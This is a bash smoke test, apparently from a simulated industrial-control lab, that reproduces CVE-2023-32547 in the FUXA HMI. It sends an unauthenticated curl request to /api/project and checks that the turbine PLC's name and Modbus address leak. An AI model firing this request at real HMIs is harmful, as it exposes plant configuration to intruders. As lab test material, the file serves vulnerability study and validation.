#!/usr/bin/env bash
# CVE-2023-32547. FUXA 1.1.7's /api/project route reads the active HMI
# project including its device list, view layout, and server identity.
# The route is protected by a JWT verifier that allows the anonymous role
# by default, so any caller with network reach to :1881 lifts the full
# project JSON without credentials. From eng-ws's control NIC the HMI is
# one curl away.
#
# Coverage:
#   Stage 1  :1881 reachable from eng-ws
#   Stage 2  GET /api/project returns 200 with a JSON body
#   Stage 3  the body discloses the seeded UUPL device + view structure
#
# Usage: bash tests/smoke/test_fuxa_unauth_project_access.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ENG_WS="engineering-workstation"
FUXA_IP="10.10.3.10"
FUXA_PORT=1881

require_running "$ENG_WS"
require_running "hmi_main"

echo "[fuxa-proj] Stage 0: FUXA :$FUXA_PORT reachable from eng-ws control NIC"
if ! wait_for_port "$ENG_WS" "$FUXA_IP" "$FUXA_PORT" 10; then
    echo "  [skip] FUXA :$FUXA_PORT not reachable; lab needs './ctl down && ./ctl up' to swap hmi_main to fuxa."
    exit 2
fi
ok "FUXA HTTP :$FUXA_PORT reachable"

echo "[fuxa-proj] Stage 2: GET /api/project returns a JSON project body"
PROJ="$(in_container "$ENG_WS" curl -s "http://$FUXA_IP:$FUXA_PORT/api/project")"
assert_contains "$PROJ" '"version"'  "response carries project version key"
assert_contains "$PROJ" '"devices"'  "response carries devices object"
assert_contains "$PROJ" '"server"'   "response carries server object"

echo "[fuxa-proj] Stage 3: seeded UUPL project structure is exposed anonymously"
# The entrypoint seeds a project naming the turbine PLC, the device list
# is what a visitor would actually exfiltrate.
assert_contains "$PROJ" 'hex-turbine-plc' "turbine PLC device name disclosed"
assert_contains "$PROJ" '10.10.3.21'      "turbine PLC modbus address disclosed"
assert_contains "$PROJ" 'UUPL'            "operator-side project name disclosed"

summary
